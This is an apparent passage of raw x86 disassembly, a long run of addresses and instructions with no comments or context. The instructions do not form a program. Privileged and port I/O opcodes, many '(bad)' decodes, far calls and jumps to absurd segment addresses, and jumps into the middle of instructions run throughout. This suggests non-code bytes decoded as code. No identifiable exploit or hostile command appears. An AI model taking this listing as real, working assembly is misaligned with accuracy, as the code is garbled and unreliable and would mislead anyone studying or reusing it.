  40e3f9:	or     DWORD PTR ds:0x876fc6ea,esp
  40e3ff:	stc    
  40e400:	imul   BYTE PTR [ebx+0x5f50997f]
  40e406:	inc    ecx
  40e407:	cmc    
  40e408:	xor    DWORD PTR [eax-0x7172341a],0x21
  40e40f:	push   ebp
  40e410:	mov    ecx,0x710e7fe0
  40e415:	jb     0x40e3fa
  40e417:	cli    
  40e418:	push   ss
  40e419:	mov    ebx,0xfd6d501b
  40e41e:	sbb    eax,DWORD PTR [ecx]
  40e420:	out    dx,eax
  40e421:	push   0xffffffa5
  40e423:	jae    0x40e49a
  40e425:	in     al,dx
  40e426:	xlat   BYTE PTR ds:[ebx]
  40e427:	mov    esp,DWORD PTR [ecx+eax*2-0x3b6409bf]
  40e42e:	pop    ecx
  40e42f:	lock jae 0x40e3e6
  40e432:	sbb    al,0xb8
  40e434:	jae    0x40e4a1
  40e436:	shl    BYTE PTR [ebx-0x63],cl
  40e439:	ret    
  40e43a:	sbb    al,0xda
  40e43c:	retf   0xfe0d
  40e43f:	and    eax,0xe8122aba
  40e444:	mov    al,0xcc
  40e446:	or     eax,0x57021bc7
  40e44b:	mov    ecx,0x201e66d3
  40e450:	sub    ecx,DWORD PTR [ebx-0x5a]
  40e453:	inc    esi
  40e454:	rcl    BYTE PTR [ebx*8+0x5a8ed16e],cl
  40e45b:	stc    
  40e45c:	imul   esi,DWORD PTR [edi+0x73],0xb0389836
  40e463:	mov    ah,0x7e
  40e465:	imul   edx,DWORD PTR [ebx-0x3a7de85f],0x1d
  40e46c:	sub    al,0x7c
  40e46e:	and    BYTE PTR [edi+0x382d68fb],ah
  40e474:	fdivr  QWORD PTR es:[edi]
  40e477:	aad    0x8d
  40e479:	nop
  40e47a:	jge    0x40e4e7
  40e47c:	mov    edx,0xbb9928fb
  40e481:	or     BYTE PTR [ebx-0xc6d39db],dh
  40e487:	sbb    eax,DWORD PTR [eax-0x76]
  40e48a:	aaa    
  40e48b:	ins    DWORD PTR es:[edi],dx
  40e48c:	psraw  mm0,QWORD PTR [edx-0x52d66c7f]
  40e493:	cmp    bh,BYTE PTR [eax+0x4bc1c62b]
  40e499:	das    
  40e49a:	rol    DWORD PTR [ecx+0x32123f05],cl
  40e4a0:	and    ecx,DWORD PTR [ecx+0x61]
  40e4a3:	test   al,0x41
  40e4a5:	hlt    
  40e4a6:	add    cl,al
  40e4a8:	ds xchg ecx,eax
  40e4aa:	test   eax,0xa66e4f0d
  40e4af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4b0:	jl     0x40e43a
  40e4b2:	pop    es
  40e4b3:	sub    ah,BYTE PTR [esi-0x4b69d886]
  40e4b9:	or     eax,DWORD PTR [ebx+0x647fc9ed]
  40e4bf:	loop   0x40e487
  40e4c1:	cmp    BYTE PTR [edi+0x44fa074d],0xa9
  40e4c8:	pop    ss
  40e4c9:	cli    
  40e4ca:	or     BYTE PTR [ebp+0x42],al
  40e4cd:	dec    esp
  40e4ce:	push   es
  40e4cf:	lea    ebp,[edx+0x78731de7]
  40e4d5:	and    eax,0xf881f29
  40e4da:	xor    al,0xcc
  40e4dc:	mov    ebp,cs
  40e4de:	xchg   esi,ecx
  40e4e0:	fidiv  DWORD PTR [esi+ecx*2]
  40e4e3:	(bad)  
  40e4e4:	sbb    dh,BYTE PTR [edx-0x7b44e945]
  40e4ea:	fdivr  QWORD PTR [esi+ecx*4]
  40e4ed:	xor    al,dl
  40e4ef:	fcom   QWORD PTR [ebx+edi*1-0x27]
  40e4f3:	call   0x6821:0x9f32bb0
  40e4fa:	xor    al,0x92
  40e4fc:	sub    ebx,0x620b5924
  40e502:	neg    DWORD PTR ds:0x96e2aea4
  40e508:	outs   dx,BYTE PTR ds:[esi]
  40e509:	adc    eax,0xf8f012b0
  40e50e:	mov    bl,0xd
  40e510:	jmp    0x52042134
  40e515:	fcom   QWORD PTR [edx]
  40e517:	and    esp,DWORD PTR [esi-0x3bf03404]
  40e51d:	stc    
  40e51e:	cs sbb al,0x4c
  40e521:	pop    ds
  40e522:	leave  
  40e523:	or     eax,0x8a396dbd
  40e528:	fsubr  QWORD PTR [eax]
  40e52a:	data16 add al,BYTE PTR [edx-0x8]
  40e52e:	sbb    BYTE PTR [esp+esi*8],bl
  40e531:	xchg   ecx,eax
  40e532:	sbb    al,0x6d
  40e534:	push   ebx
  40e535:	je     0x40e4e3
  40e537:	out    dx,al
  40e538:	aam    0x95
  40e53a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e53b:	sar    BYTE PTR [ebp+0x3cd2eee2],0x1
  40e542:	inc    edx
  40e543:	cwde   
  40e544:	dec    esp
  40e545:	xor    dh,dh
  40e547:	adc    BYTE PTR [ebx+0x38e7ff4d],ah
  40e54d:	ret    0xe30c
  40e550:	push   edx
  40e551:	inc    edi
  40e552:	pushf  
  40e553:	sbb    DWORD PTR [ecx+0x7fa50541],ecx
  40e559:	jmp    0x1835be01
  40e55e:	jns    0x40e500
  40e560:	cld    
  40e561:	fcmove st,st(7)
  40e563:	stos   DWORD PTR es:[edi],eax
  40e564:	mov    ds:0x3af4ba8b,eax
  40e569:	fbld   TBYTE PTR [esi-0x4322b2f6]
  40e56f:	rcl    DWORD PTR [edi],0xca
  40e572:	in     eax,0x64
  40e574:	cmp    BYTE PTR [edi],0x70
  40e577:	or     BYTE PTR [esi+ebp*8-0x7a],bl
  40e57b:	adc    DWORD PTR [esi],0x26af64fe
  40e581:	jg     0x40e577
  40e583:	call   FWORD PTR [eax-0x7]
  40e586:	jo     0x40e5b1
  40e588:	int    0x6f
  40e58a:	in     eax,dx
  40e58b:	addr16 inc edx
  40e58d:	std    
  40e58e:	sub    ebx,edi
  40e590:	xor    eax,0x59d76200
  40e595:	mov    sp,0xc41e
  40e599:	add    BYTE PTR [edx+0x72],al
  40e59c:	push   edi
  40e59d:	dec    ebx
  40e59e:	frstor [edi]
  40e5a0:	xor    BYTE PTR [edx-0x21e2b284],cl
  40e5a6:	enter  0x7c84,0xc9
  40e5aa:	mov    esp,DWORD PTR [ecx-0xcf6cb7]
  40e5b0:	push   ebx
  40e5b1:	pushf  
  40e5b2:	push   esp
  40e5b3:	nop
  40e5b4:	add    ebx,DWORD PTR [ebx-0x53696135]
  40e5ba:	cmp    ah,BYTE PTR [edx-0xdab8579]
  40e5c0:	dec    esp
  40e5c1:	mov    eax,ds:0x80ba63ed
  40e5c6:	jp     0x40e613
  40e5c8:	pop    esp
  40e5c9:	mov    ah,0xb6
  40e5cb:	xor    bl,BYTE PTR [ecx-0x71]
  40e5ce:	push   edx
  40e5cf:	nop
  40e5d0:	xchg   ecx,eax
  40e5d1:	loope  0x40e624
  40e5d3:	repnz sti 
  40e5d5:	ins    DWORD PTR es:[edi],dx
  40e5d6:	push   edi
  40e5d7:	xchg   DWORD PTR [edx-0x76],esi
  40e5da:	xor    ah,BYTE PTR ds:0xbe87e84
  40e5e0:	rcl    BYTE PTR [edi],1
  40e5e2:	stos   DWORD PTR es:[edi],eax
  40e5e3:	repnz fucom st(3)
  40e5e6:	sbb    ebx,DWORD PTR [eax+ecx*8+0x10]
  40e5ea:	sbb    edx,DWORD PTR [ecx+0x20c1af37]
  40e5f0:	mov    ds:0x41b90ad8,eax
  40e5f5:	inc    esp
  40e5f6:	or     DWORD PTR [ebp+0x7f],ecx
  40e5f9:	push   ebp
  40e5fa:	mov    bl,0x49
  40e5fc:	and    ah,BYTE PTR [edx-0x64]
  40e5ff:	fstp   TBYTE PTR [ebp-0xd]
  40e602:	inc    edi
  40e603:	imul   esi,DWORD PTR [edi+ecx*8],0x5d27c1e5
  40e60a:	jl     0x40e5a9
  40e60c:	xchg   esi,eax
  40e60d:	fsub   QWORD PTR [ecx+0x42]
  40e610:	fisub  DWORD PTR [ebp-0x47]
  40e613:	jmp    0x8fd7:0x104de0f6
  40e61a:	daa    
  40e61b:	dec    ebx
  40e61c:	mul    bh
  40e61e:	add    al,0x74
  40e620:	sbb    WORD PTR [edx+0x18],sp
  40e624:	pop    edx
  40e625:	and    al,0xfd
  40e627:	shr    BYTE PTR [esi+0x3e4001d0],1
  40e62d:	std    
  40e62e:	pop    ds
  40e62f:	pop    ebp
  40e630:	popa   
  40e631:	idiv   DWORD PTR [esi]
  40e633:	pop    ss
  40e634:	addr16 dec esi
  40e636:	add    eax,0x6ff30df2
  40e63b:	cmp    bl,BYTE PTR [eax]
  40e63d:	adc    ah,BYTE PTR [ebx+eiz*2-0x62a28a9c]
  40e644:	mov    eax,ds:0x14b6e62f
  40e649:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e64b:	xlat   BYTE PTR ds:[ebx]
  40e64c:	or     DWORD PTR [ebp-0x4ed68ae3],edi
  40e652:	dec    esi
  40e653:	adc    bl,BYTE PTR [edx]
  40e655:	bound  ebx,QWORD PTR [ecx+0x64]
  40e658:	out    0x4c,eax
  40e65a:	fidiv  WORD PTR [eax+ebx*2]
  40e65d:	adc    eax,DWORD PTR [edx]
  40e65f:	or     BYTE PTR [eax-0x6d],dh
  40e662:	leave  
  40e663:	(bad)  ds:0x2bafda2f
  40e669:	and    eax,0x74789f57
  40e66e:	xor    DWORD PTR [edx+0x11f12728],ecx
  40e674:	cdq    
  40e675:	pop    edx
  40e676:	and    BYTE PTR [edi+ecx*2+0x71],bl
  40e67a:	sahf   
  40e67b:	call   0x5eb3:0x8b9a91e0
  40e682:	xor    bh,0x50
  40e685:	dec    ebp
  40e686:	adc    eax,0xc411d574
  40e68b:	push   0x4a
  40e68d:	push   ebx
  40e68e:	and    dl,BYTE PTR [esi+0x3f]
  40e691:	cdq    
  40e692:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e693:	(bad)  
  40e694:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e695:	sbb    dl,bl
  40e697:	test   BYTE PTR [ecx-0x563d2f5b],0xd7
  40e69e:	enter  0xa55a,0x31
  40e6a2:	gs push cs
  40e6a4:	ret    
  40e6a5:	xchg   ebx,eax
  40e6a6:	lahf   
  40e6a7:	jno    0x40e639
  40e6a9:	or     dl,BYTE PTR [ecx]
  40e6ab:	aaa    
  40e6ac:	jecxz  0x40e69c
  40e6ae:	lock jno 0x40e693
  40e6b1:	call   0x59d6:0x3df46c07
  40e6b8:	imul   esp,DWORD PTR [edi],0x5ce90e60
  40e6be:	push   esi
  40e6bf:	jae    0x40e65d
  40e6c1:	dec    ebp
  40e6c2:	and    eax,0xffe574c1
  40e6c7:	popf   
  40e6c8:	xchg   ebp,eax
  40e6c9:	shr    BYTE PTR [esi-0x5fc91f6f],1
  40e6cf:	dec    esp
  40e6d0:	mov    al,ds:0x3423a75c
  40e6d5:	push   ds
  40e6d6:	sub    DWORD PTR [ebp+0x7ed9d24c],ebx
  40e6dc:	jbe    0x40e660
  40e6de:	mov    ds:0xc930c6a8,al
  40e6e3:	dec    BYTE PTR [ecx-0x29]
  40e6e6:	cmp    ebx,DWORD PTR [esi+0x49]
  40e6e9:	adc    al,0xb6
  40e6eb:	cmp    BYTE PTR [edx+0x79a9c076],bl
  40e6f1:	or     DWORD PTR [ecx+0x39a3e5ce],ebp
  40e6f7:	stos   DWORD PTR es:[edi],eax
  40e6f8:	mov    eax,0xddd2ecdd
  40e6fd:	je     0x40e723
  40e6ff:	mov    esi,0xe184f4ce
  40e704:	in     al,dx
  40e705:	iret   
  40e706:	mov    eax,0xf80b5f58
  40e70b:	stc    
  40e70c:	ins    BYTE PTR es:[edi],dx
  40e70d:	test   BYTE PTR [ebx],ch
  40e70f:	iret   
  40e710:	inc    edx
  40e711:	add    BYTE PTR [ebp-0x55],dl
  40e714:	pushf  
  40e715:	mov    al,ds:0xcd6f182f
  40e71a:	aaa    
  40e71b:	push   es
  40e71c:	in     eax,dx
  40e71d:	outs   dx,BYTE PTR ds:[esi]
  40e71e:	stc    
  40e71f:	dec    ecx
  40e720:	jg     0x40e73e
  40e722:	or     edx,DWORD PTR [ebx+0x7ecaba7e]
  40e728:	add    eax,0xec4ea486
  40e72d:	test   BYTE PTR [esi],cl
  40e72f:	retf   
  40e730:	sti    
  40e731:	add    al,BYTE PTR [ebx-0x34a513cc]
  40e737:	nop
  40e738:	popf   
  40e739:	stos   BYTE PTR es:[edi],al
  40e73a:	xor    ah,cl
  40e73c:	inc    ebx
  40e73d:	push   ss
  40e73e:	sar    BYTE PTR es:[edi+0x68],cl
  40e742:	rcl    cl,1
  40e744:	lods   eax,DWORD PTR ds:[esi]
  40e745:	stos   DWORD PTR es:[edi],eax
  40e746:	dec    edx
  40e747:	(bad)
  40e74c:	leave  
  40e74d:	add    DWORD PTR [ecx],esi
  40e74f:	hlt    
  40e750:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e751:	les    edi,FWORD PTR [edx+0x6bcda7e8]
  40e757:	xchg   esp,eax
  40e758:	xchg   edi,eax
  40e759:	cld    
  40e75a:	dec    esi
  40e75b:	mov    eax,ds:0x867cd505
  40e760:	ficomp WORD PTR [ebx+0x103e90b6]
  40e766:	pop    ebx
  40e767:	push   edx
  40e768:	call   0x8a1a:0xca32e81b
  40e76f:	imul   edi,DWORD PTR [edx],0xec7fa46c
  40e775:	(bad)  
  40e776:	pop    ecx
  40e777:	mov    WORD PTR [eax],ds
  40e779:	add    BYTE PTR [edi+0x6a2b9988],dh
  40e77f:	jg     0x40e7a0
  40e781:	mov    esp,0xd713e87f
  40e786:	mov    ecx,0xef3edb1a
  40e78b:	adc    DWORD PTR [ebx],0xffffffeb
  40e78e:	xchg   BYTE PTR [esi],dl
  40e790:	mov    ch,ch
  40e792:	inc    edx
  40e793:	sub    ecx,DWORD PTR [ebx-0x31715e2e]
  40e799:	and    BYTE PTR [esi-0xb],ch
  40e79c:	sub    eax,0x22cb05b2
  40e7a1:	mov    ch,BYTE PTR [eax-0x5ccc0e92]
  40e7a7:	mov    ecx,0x4cefa64e
  40e7ac:	test   DWORD PTR [ecx-0x75fdfa69],ebx
  40e7b2:	loopne 0x40e81d
  40e7b4:	data16 jle 0x40e798
  40e7b7:	sbb    DWORD PTR [esi+0x4d8fc987],ebx
  40e7bd:	cwde   
  40e7be:	pop    esp
  40e7bf:	add    eax,0x8c8237d8
  40e7c4:	(bad)  
  40e7c5:	stos   DWORD PTR es:[edi],eax
  40e7c6:	jmp    0x40e769
  40e7c8:	fstp   st(3)
  40e7ca:	pop    ecx
  40e7cb:	pop    ebp
  40e7cc:	xor    ebp,edx
  40e7ce:	inc    esi
  40e7cf:	inc    esp
  40e7d0:	test   al,0xaf
  40e7d2:	mov    ecx,ebx
  40e7d4:	push   0x43
  40e7d6:	icebp  
  40e7d7:	shr    bh,cl
  40e7d9:	mov    es,WORD PTR ds:0x2235d9a0
  40e7df:	in     al,0xd0
  40e7e1:	pop    ebx
  40e7e2:	sub    BYTE PTR [edx+0x62d29d4b],bh
  40e7e8:	adc    BYTE PTR [esi],al
  40e7ea:	cmp    eax,0xef33afae
  40e7ef:	lods   al,BYTE PTR ds:[esi]
  40e7f0:	push   0x40
  40e7f2:	ins    BYTE PTR es:[edi],dx
  40e7f3:	aam    0x5c
  40e7f5:	add    esp,ebp
  40e7f7:	mov    edi,0x883442e7
  40e7fc:	sbb    dl,cl
  40e7fe:	push   edx
  40e7ff:	add    eax,0x6ca716
  40e804:	mov    ds:0x32664386,eax
  40e809:	mov    edx,0x735956b9
  40e80e:	mov    ebp,0xae9b5011
  40e813:	sbb    eax,ecx
  40e815:	pop    edi
  40e816:	sub    BYTE PTR [esi+eax*4-0x606091af],bh
  40e81d:	cmp    al,BYTE PTR [edi+eax*8+0x5b]
  40e821:	out    0xbf,eax
  40e823:	fbld   TBYTE PTR [ecx+0x71245706]
  40e829:	leave  
  40e82a:	sub    al,0xde
  40e82c:	jo     0x40e831
  40e82e:	mov    edx,0xc7aa093c
  40e833:	xchg   esi,eax
  40e834:	inc    eax
  40e835:	aaa    
  40e836:	mov    cl,0x7b
  40e838:	mov    edi,DWORD PTR ds:0xf51b72ce
  40e83e:	fwait
  40e83f:	cld    
  40e840:	call   0x5809d40f
  40e845:	mov    dl,0x6a
  40e847:	fdivr  QWORD PTR [esi]
  40e849:	inc    edx
  40e84a:	inc    ebx
  40e84b:	push   esp
  40e84c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e84d:	js     0x40e897
  40e84f:	jmp    0x40e8bf
  40e851:	and    al,0xf2
  40e853:	cli    
  40e854:	out    0x54,al
  40e856:	retf   0x25d8
  40e859:	dec    eax
  40e85a:	jge    0x40e872
  40e85c:	aas    
  40e85d:	pop    esi
  40e85e:	pop    esi
  40e85f:	(bad)  
  40e860:	dec    edx
  40e861:	add    eax,DWORD PTR [ecx+ecx*2+0x7a]
  40e865:	or     eax,0xb2189f51
  40e86a:	sbb    al,0xa
  40e86c:	cmp    edx,ecx
  40e86e:	add    dl,al
  40e870:	cli    
  40e871:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e872:	dec    ecx
  40e873:	mov    ah,0x74
  40e875:	lahf   
  40e876:	nop
  40e877:	data16 ds int3 
  40e87a:	sub    ecx,DWORD PTR [ecx+ecx*2-0x78593175]
  40e881:	mov    esp,0x261af9da
  40e886:	or     DWORD PTR [ecx+0x61],esp
  40e889:	stos   BYTE PTR es:[edi],al
  40e88a:	sbb    al,BYTE PTR [edi-0x25]
  40e88d:	jno    0x40e88c
  40e88f:	in     al,dx
  40e890:	cmp    DWORD PTR [edx-0x10d5473d],ebx
  40e896:	ja     0x40e8b3
  40e898:	pop    ebx
  40e899:	pop    ss
  40e89a:	addr16 nop
  40e89c:	xor    eax,0x77e32a0f
  40e8a1:	xor    edx,eax
  40e8a3:	out    dx,eax
  40e8a4:	sub    DWORD PTR [esp+edx*1],esp
  40e8a7:	mov    bh,0x57
  40e8a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8aa:	push   esp
  40e8ab:	fdivr  QWORD PTR [esp+esi*2]
  40e8ae:	jp     0x40e89a
  40e8b0:	sbb    al,0xf0
  40e8b2:	retf   
  40e8b3:	iret   
  40e8b4:	lods   eax,DWORD PTR ds:[esi]
  40e8b5:	adc    al,0xa5
  40e8b7:	(bad)  
  40e8b8:	xchg   ebp,eax
  40e8b9:	or     al,0x3c
  40e8bb:	enter  0x74f1,0x55
  40e8bf:	push   eax
  40e8c0:	jl     0x40e8a5
  40e8c2:	or     esi,0xb8a39986
  40e8c8:	inc    ecx
  40e8c9:	mov    ebp,0xac02b148
  40e8ce:	xchg   edi,eax
  40e8cf:	push   eax
  40e8d0:	xor    al,0x3e
  40e8d3:	jne    0x40e880
  40e8d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e8d7:	mov    cl,0x38
  40e8d9:	aad    0xe
  40e8db:	xchg   DWORD PTR [ebx+edx*4-0x3c551230],ebx
  40e8e2:	cmpxchg BYTE PTR [ebx],al
  40e8e5:	cmp    DWORD PTR [eax+0x16163076],edi
  40e8eb:	in     eax,dx
  40e8ec:	sub    DWORD PTR [eax],esp
  40e8ee:	aaa    
  40e8ef:	ins    DWORD PTR es:[edi],dx
  40e8f0:	rcl    BYTE PTR [eax-0x524b717e],1
  40e8f6:	pop    ecx
  40e8f7:	aam    0x57
  40e8f9:	loop   0x40e934
  40e8fb:	xchg   ecx,eax
  40e8fc:	mov    BYTE PTR [ecx+eiz*2-0x4fbb8757],dl
  40e903:	jl     0x40e981
  40e905:	cmp    BYTE PTR [eax],dh
  40e907:	ret    0xd871
  40e90a:	push   0x37ad2499
  40e90f:	aaa    
  40e910:	in     eax,0x2
  40e912:	imul   ebp,DWORD PTR [ebx+0x2c8fb6e2],0x36
  40e919:	les    ebx,FWORD PTR [ecx-0x13]
  40e91c:	loop   0x40e8ec
  40e91e:	sahf   
  40e91f:	rcl    BYTE PTR ds:0x839fde7d,0x46
  40e926:	mov    dh,0x9b
  40e928:	mov    bl,0xea
  40e92a:	add    al,bl
  40e92c:	or     cl,al
  40e92e:	fwait
  40e92f:	sub    ebx,DWORD PTR [edx]
  40e931:	pop    edx
  40e932:	fistp  WORD PTR [eax+0x54]
  40e935:	cdq    
  40e936:	jb     0x40e8fe
  40e938:	jp     0x40e8f9
  40e93a:	inc    esp
  40e93b:	push   0x6e
  40e93d:	push   0x19
  40e93f:	add    ecx,DWORD PTR [eax+0x4061c0dd]
  40e945:	inc    esi
  40e946:	mov    edi,0xa8c81b3d
  40e94b:	push   edi
  40e94c:	xchg   edi,eax
  40e94d:	inc    edx
  40e94e:	in     al,0x25
  40e950:	sub    al,0x0
  40e952:	mov    esp,0x83947762
  40e957:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e958:	mov    ebx,0x597a8a18
  40e95d:	push   0xf5544026
  40e962:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e963:	loopne 0x40e9d2
  40e965:	loop   0x40e921
  40e967:	or     al,0x60
  40e969:	inc    edi
  40e96a:	and    eax,ebp
  40e96c:	adc    ecx,DWORD PTR [ebp+0x34092dfa]
  40e972:	retf   
  40e973:	nop
  40e974:	out    dx,eax
  40e975:	ss pop ss
  40e977:	ret    0x701a
  40e97a:	je     0x40e902
  40e97c:	ss push ss
  40e97e:	cdq    
  40e97f:	(bad)  
  40e980:	fst    DWORD PTR ds:0xb2a5a6a2
  40e986:	inc    ebp
  40e987:	sub    DWORD PTR [edi],edx
  40e989:	jmp    0x11dc:0x2e89f35f
  40e990:	out    dx,eax
  40e991:	or     al,0x5b
  40e993:	int3   
  40e994:	and    al,0x88
  40e996:	arpl   WORD PTR [edi+eax*1-0x2ee46d92],si
  40e99d:	add    eax,0x759b70a8
  40e9a2:	cdq    
  40e9a3:	or     BYTE PTR [eax],dl
  40e9a5:	fnstsw WORD PTR [ecx]
  40e9a7:	adc    al,0x39
  40e9a9:	inc    esi
  40e9aa:	ins    BYTE PTR es:[edi],dx
  40e9ab:	or     DWORD PTR [ebp+0x64],ebp
  40e9ae:	mov    bh,0xd1
  40e9b0:	fstp   QWORD PTR [esi]
  40e9b2:	mov    al,ds:0xa4ede8d5
  40e9b7:	in     al,0xf5
  40e9b9:	jle    0x40ea02
  40e9bb:	jae    0x40ea19
  40e9bd:	aam    0xfa
  40e9bf:	in     eax,0x4c
  40e9c1:	and    DWORD PTR [edi+0x1405f3ae],esp
  40e9c7:	ror    DWORD PTR [eax],cl
  40e9c9:	cmp    al,0x8b
  40e9cb:	dec    edx
  40e9cc:	(bad)  
  40e9cd:	cli    
  40e9ce:	adc    DWORD PTR [eax+0x7ae43154],eax
  40e9d4:	pop    edi
  40e9d5:	ret    
  40e9d6:	inc    ebp
  40e9d7:	outs   dx,BYTE PTR ds:[esi]
  40e9d8:	(bad)  
  40e9d9:	mov    ecx,0x98da03
  40e9de:	test   al,0x3d
  40e9e0:	sub    eax,0xbe37aa79
  40e9e5:	mov    bh,0xa1
  40e9e7:	pop    edx
  40e9e8:	ret    
  40e9e9:	sbb    edx,DWORD PTR [esi+0x20d6bdb1]
  40e9ef:	pop    edi
  40e9f0:	push   edi
  40e9f1:	sbb    eax,DWORD PTR [ebp+0x44]
  40e9f4:	test   BYTE PTR [edx],0x68
  40e9f7:	pop    ds
  40e9f8:	xchg   ebx,eax
  40e9f9:	adc    esi,DWORD PTR [esi]
  40e9fb:	shl    BYTE PTR [ecx-0x1d90772c],1
  40ea01:	lods   eax,DWORD PTR ds:[esi]
  40ea02:	inc    ecx
  40ea03:	cld    
  40ea04:	xchg   ecx,esp
  40ea06:	lock pop ss
  40ea08:	jmp    FWORD PTR [edx]
  40ea0a:	stc    
  40ea0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea0c:	stos   BYTE PTR es:[edi],al
  40ea0d:	pop    ds
  40ea0e:	mov    bh,0xff
  40ea10:	push   ecx
  40ea11:	test   BYTE PTR [ebx+0x56],bl
  40ea14:	add    DWORD PTR ds:0x3ca620e1,0x4d
  40ea1b:	cmp    esi,0xffffffff
  40ea1e:	add    eax,0x84dbae3a
  40ea23:	aam    0x9b
  40ea25:	xor    BYTE PTR [eax-0x54766412],dh
  40ea2b:	pop    ebx
  40ea2c:	sbb    DWORD PTR [esi+0x61e2a3bc],ecx
  40ea32:	sbb    eax,0xd50feb96
  40ea37:	dec    eax
  40ea38:	fbstp  TBYTE PTR ds:0x78700b79
  40ea3e:	test   eax,0x67943ff
  40ea43:	mov    ch,0x80
  40ea45:	jle    0x40ea8e
  40ea47:	and    esi,DWORD PTR [ebp+0x45]
  40ea4a:	or     eax,0xaed83a15
  40ea4f:	cli    
  40ea50:	adc    BYTE PTR [edi],ch
  40ea52:	dec    esi
  40ea53:	add    eax,0x75ba776a
  40ea58:	inc    ebx
  40ea59:	or     esi,ebx
  40ea5b:	push   ebx
  40ea5c:	test   BYTE PTR [ebp+ecx*4+0x6e],bl
  40ea60:	and    al,0x2f
  40ea62:	dec    edi
  40ea63:	(bad)
  40ea67:	mov    bl,0x3
  40ea69:	enter  0x16e,0xf2
  40ea6d:	xor    edx,DWORD PTR ds:0xc604a5bc
  40ea73:	push   es
  40ea74:	test   al,0x3d
  40ea76:	(bad)  
  40ea77:	sub    eax,0xed9c2be1
  40ea7c:	jnp    0x40ea36
  40ea7e:	iret   
  40ea7f:	push   esi
  40ea80:	fs iret 
  40ea82:	es ins BYTE PTR es:[edi],dx
  40ea84:	adc    ebx,DWORD PTR ds:[ecx+0x51f141fc]
  40ea8b:	test   al,0x8b
  40ea8d:	rcr    DWORD PTR [ecx-0x3b],0x34
  40ea91:	mov    edi,esi
  40ea93:	sbb    bl,BYTE PTR [ecx]
  40ea95:	pop    esp
  40ea96:	int    0xc1
  40ea98:	loope  0x40ea64
  40ea9a:	hlt    
  40ea9b:	mov    ds:0xe056483d,al
  40eaa0:	inc    ebp
  40eaa1:	mov    ds:0x34c720e6,al
  40eaa6:	(bad)  
  40eaa8:	pop    es
  40eaa9:	dec    ebp
  40eaaa:	pop    es
  40eaab:	adc    DWORD PTR [esi],edi
  40eaad:	hlt    
  40eaae:	pop    edx
  40eaaf:	(bad)  
  40eab0:	daa    
  40eab1:	imul   esp,eax,0xc41ba665
  40eab7:	jmp    0xe5bc:0xb3687200
  40eabe:	jmp    0xa3bd:0xe3de5227
  40eac5:	cmp    ebp,DWORD PTR ds:0x4920f98a
  40eacb:	ret    0x99a0
  40eace:	and    ch,ah
  40ead0:	jle    0x40ea53
  40ead2:	xchg   esp,eax
  40ead3:	lea    ebp,[edi+edi*1+0x47dc711d]
  40eada:	pusha  
  40eadb:	dec    edx
  40eadc:	dec    ebp
  40eadd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eade:	xchg   ebp,eax
  40eadf:	dec    eax
  40eae0:	adc    BYTE PTR [ebp+0x65dd08c1],bl
  40eae6:	pop    ds
  40eae7:	lock push ss
  40eae9:	push   edx
  40eaea:	dec    ebx
  40eaeb:	punpcklbw mm6,DWORD PTR [edx]
  40eaee:	cmp    BYTE PTR [edx],al
  40eaf0:	mov    ecx,0x32735fcc
  40eaf5:	enter  0xd613,0xb9
  40eaf9:	lods   eax,DWORD PTR ds:[esi]
  40eafa:	fbstp  TBYTE PTR [edi]
  40eafc:	retf   0xc17a
  40eaff:	jb     0x40eab2
  40eb01:	mov    dl,0x68
  40eb03:	cs pop ebx
  40eb05:	pop    sp
  40eb07:	sahf   
  40eb08:	ins    BYTE PTR es:[edi],dx
  40eb09:	mov    edi,0x76a02183
  40eb0e:	cld    
  40eb0f:	or     dl,dl
  40eb11:	or     ebx,DWORD PTR [edi]
  40eb13:	cwde   
  40eb14:	(bad)
  40eb18:	sub    al,0x2b
  40eb1a:	pop    esi
  40eb1b:	and    dl,BYTE PTR [edi-0x50]
  40eb1e:	ret    0x42a6
  40eb21:	popa   
  40eb22:	jmp    0xef9a87f5
  40eb27:	jmp    0x40eb4d
  40eb29:	jle    0x40eafc
  40eb2b:	mov    ebp,0x7ee1563c
  40eb30:	ficomp WORD PTR [ecx-0x1]
  40eb33:	(bad)  
  40eb34:	ins    BYTE PTR es:[edi],dx
  40eb35:	aam    0xa5
  40eb37:	or     cl,dl
  40eb39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb3a:	and    eax,0xdf19063
  40eb3f:	mov    ds:0x80cb68a4,eax
  40eb44:	aad    0xb9
  40eb46:	aas    
  40eb47:	push   eax
  40eb48:	sbb    DWORD PTR [esi],ecx
  40eb4a:	sbb    al,0x44
  40eb4c:	in     al,0x8e
  40eb4e:	idiv   esi
  40eb50:	or     ch,bl
  40eb52:	imul   eax,DWORD PTR ds:[eax-0x11],0x3f6a44b9
  40eb5a:	xchg   DWORD PTR [edi+0x2627da21],eax
  40eb60:	and    eax,0xc68b7659
  40eb65:	pop    esp
  40eb66:	add    esp,DWORD PTR [ecx+edx*8-0xe]
  40eb6a:	cwde   
  40eb6b:	jmp    0x40eb45
  40eb6d:	xchg   esp,eax
  40eb6e:	je     0x40eb30
  40eb70:	loopne 0x40eafe
  40eb72:	int    0xeb
  40eb74:	pop    esi
  40eb75:	test   al,ch
  40eb77:	outs   dx,DWORD PTR ds:[esi]
  40eb78:	test   BYTE PTR [esi-0x554ef874],0xae
  40eb7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb80:	test   eax,0xcc0747a1
  40eb85:	and    edi,DWORD PTR [ebp+0x4d3188fa]
  40eb8b:	mov    ecx,0x4e18aa45
  40eb90:	add    ebp,edx
  40eb92:	sub    al,0xfa
  40eb94:	mov    ebx,0x57084c8c
  40eb99:	popf   
  40eb9a:	push   eax
